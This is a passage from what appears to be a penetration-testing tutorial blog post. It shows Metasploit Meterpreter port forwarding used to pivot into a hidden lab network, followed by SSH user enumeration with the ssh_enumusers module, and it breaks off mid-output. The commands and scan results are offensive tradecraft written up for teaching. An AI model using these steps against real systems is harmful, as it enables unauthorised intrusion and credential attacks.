<p>Based on the scan results, there are SSH and HTTP services that will work on the target system. Before going further with exploitation, we will cover a another technique for traffic routing called as port forwarding.</p>
<h4>Port Forwarding</h4>
<p>Port forwarding is one of the basic steps of pivoting. Direct access to certain services running on discovered systems on the hidden network may not be available (web servers, etc.). This is because there is no double sided routing. We know how to reach the target system and make a request, but our requests will fail because the target does not know how to reach us.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-544" src="https://pentest.blog/wp-content/uploads/routingrule.png" alt="" width="873" height="188" srcset="https://pentest.blog/wp-content/uploads/routingrule.png 873w, https://pentest.blog/wp-content/uploads/routingrule-300x65.png 300w, https://pentest.blog/wp-content/uploads/routingrule-768x165.png 768w" sizes="(max-width: 873px) 100vw, 873px"></p>
<p>For this reason, we route a port on our own system to the destination via the defined meterpreter session. The routing will work as long as this process is alive.</p>
<p>There is one important point to be noted at this point, the routing we provide with the <strong>run autoroute</strong>&nbsp;command gives us the freedom to work in the Metasploit Framework. But when we try to reach the target with a Kali tools, we need tools like port forwarding or proxychains.</p>
<p>Port forwarding can be done with <strong>portfwd</strong>&nbsp;module which is one of the post modules of Metasploit.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> portfwd -h</span></div></div><div class=""><div><span class="enlighter-text">Usage: portfwd </span><span class="enlighter-g1">[</span><span class="enlighter-text">-h</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-g1">[</span><span class="enlighter-text">add </span><span class="enlighter-g0">|</span><span class="enlighter-text"> delete </span><span class="enlighter-g0">|</span><span class="enlighter-text"> list </span><span class="enlighter-g0">|</span><span class="enlighter-text"> flush</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-g1">[</span><span class="enlighter-text">args</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">OPTIONS:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    -L </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">opt</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">  Forward: local host to listen </span><span class="enlighter-m0">on</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">optional</span><span class="enlighter-g1">)</span><span class="enlighter-text">. Remote: local host to connect to.</span></div></div><div class=""><div><span class="enlighter-text">    -R        Indicates a reverse port forward.</span></div></div><div class=""><div><span class="enlighter-text">    -h        Help banner.</span></div></div><div class=""><div><span class="enlighter-text">    -i </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">opt</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">  Index </span><span class="enlighter-k1">of</span><span class="enlighter-text"> the port forward entry to interact </span><span class="enlighter-m0">with</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">see the </span><span class="enlighter-s0">"list"</span><span class="enlighter-text"> command</span><span class="enlighter-g1">)</span><span class="enlighter-text">.</span></div></div><div class=""><div><span class="enlighter-text">    -l </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">opt</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">  Forward: local port to listen on. Reverse: local port to connect to.</span></div></div><div class=""><div><span class="enlighter-text">    -p </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">opt</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">  Forward: remote port to connect to. Reverse: remote port to listen on.</span></div></div><div class=""><div><span class="enlighter-text">    -r </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">opt</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">  Forward: remote host to connect to.</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span></div></div></div><div class="enlighter-raw">meterpreter &gt; portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -L &lt;opt&gt;  Forward: local host to listen on (optional). Remote: local host to connect to.
    -R        Indicates a reverse port forward.
    -h        Help banner.
    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the "list" command).
    -l &lt;opt&gt;  Forward: local port to listen on. Reverse: local port to connect to.
    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r &lt;opt&gt;  Forward: remote host to connect to.


meterpreter &gt;</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">meterpreter &gt; portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -L &lt;opt&gt;  Forward: local host to listen on (optional). Remote: local host to connect to.
    -R        Indicates a reverse port forward.
    -h        Help banner.
    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the "list" command).
    -l &lt;opt&gt;  Forward: local port to listen on. Reverse: local port to connect to.
    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r &lt;opt&gt;  Forward: remote host to connect to.


meterpreter &gt;</pre>
<p>When we send a link request to our local 2323 port on our internet browser, this connection request will be forwarded to port 80 of the computer with IP address 7.7.7.20.</p>
<p>Previously, it was determined that a web service was running on the <strong>80th TCP</strong> port of the <strong>7.7.7.20,</strong>thanks to&nbsp;ProxyChains and Nmap. In order to&nbsp;access this service, the port <strong>2323</strong> of the local system should be routed to port <strong>80</strong> of&nbsp;<strong>7.7.7.20</strong> which we want to access.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> portfwd add -L </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> -l </span><span class="enlighter-n1">2323</span><span class="enlighter-text"> -p </span><span class="enlighter-n1">80</span><span class="enlighter-text"> -r </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Local TCP relay created: </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">2323</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">80</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span></div></div></div><div class="enlighter-raw">meterpreter &gt; portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20
[*] Local TCP relay created: 172.16.0.20:2323 &lt;-&gt; 7.7.7.20:80

meterpreter &gt;</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">meterpreter &gt; portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20
[*] Local TCP relay created: 172.16.0.20:2323 &lt;-&gt; 7.7.7.20:80

meterpreter &gt;</pre>
<p>Active rules can be viewed with the <strong>portfwd list</strong> command.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> portfwd list</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Active Port Forwards</span></div></div><div class=""><div><span class="enlighter-text">====================</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Index  Local             Remote       Direction</span></div></div><div class=""><div><span class="enlighter-text">   -----  -----             ------       ---------</span></div></div><div class=""><div><span class="enlighter-text">   </span><span class="enlighter-n1">1</span><span class="enlighter-text">      </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">2323</span><span class="enlighter-text">  </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">80</span><span class="enlighter-text">  Forward</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">1</span><span class="enlighter-text"> total active port forwards.</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span></div></div></div><div class="enlighter-raw">meterpreter &gt; portfwd list

Active Port Forwards
====================

   Index  Local             Remote       Direction
   -----  -----             ------       ---------
   1      172.16.0.20:2323  7.7.7.20:80  Forward

1 total active port forwards.


meterpreter &gt;</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">meterpreter&nbsp;&gt;&nbsp;portfwd&nbsp;list

Active&nbsp;Port&nbsp;Forwards
====================

&nbsp;&nbsp;&nbsp;Index&nbsp;&nbsp;Local&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Direction
&nbsp;&nbsp;&nbsp;-----&nbsp;&nbsp;-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------
&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.0.20:2323&nbsp;&nbsp;7.7.7.20:80&nbsp;&nbsp;Forward

1&nbsp;total&nbsp;active&nbsp;port&nbsp;forwards.


meterpreter&nbsp;&gt;</pre>
<p>When the application running on port 80 of the target system with IP address 7.7.7.20 is checked, it will be detected as <strong>Eash File Sharing Web Server.</strong></p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-532" src="https://pentest.blog/wp-content/uploads/5.png" alt="" width="815" height="478" srcset="https://pentest.blog/wp-content/uploads/5.png 815w, https://pentest.blog/wp-content/uploads/5-300x176.png 300w, https://pentest.blog/wp-content/uploads/5-768x450.png 768w" sizes="(max-width: 815px) 100vw, 815px"></p>
<h4>SSH Brute-Force over&nbsp;Pivoting</h4>
<p>As you know, a SSH service was detected on 7.7.7.20. Performing a brute-force attack on this service is quite simple.</p>
<p>The <strong>SSH_enumusers</strong> auxiliary module allows user detection:</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> use auxiliary/scanner/ssh/ssh_enumusers </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">ssh_enumusers</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set rhosts </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">rhosts =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">ssh_enumusers</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set rport </span><span class="enlighter-n1">22</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">rport =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">22</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">ssh_enumusers</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set user_file /usr/share/wordlists/metasploit/default_users_for_services_unhash.</span><span class="enlighter-m3">txt</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">user_file =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> /usr/share/wordlists/metasploit/default_users_for_services_unhash.</span><span class="enlighter-m3">txt</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">ssh_enumusers</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - Checking </span><span class="enlighter-k1">for</span><span class="enlighter-text"> </span><span class="enlighter-k1">false</span><span class="enlighter-text"> positives</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - Starting scan</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'admin'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'root'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'Administrator'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'sysadm'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'tech'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'operator'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'guest'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'security'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'debug'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'manager'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'service'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'!root'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'user'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'netman'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'super'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'diag'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'Cisco'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'Manager'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'DTA'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'apc'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'User'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'Admin'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'cablecom'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'adm'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'wradmin'</span><span class="enlighter-text"> found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">-</span><span class="enlighter-g1">]</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text"> - SSH - User </span><span class="enlighter-s0">'netscreen'</span><span class="enlighter-text"> not found</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span 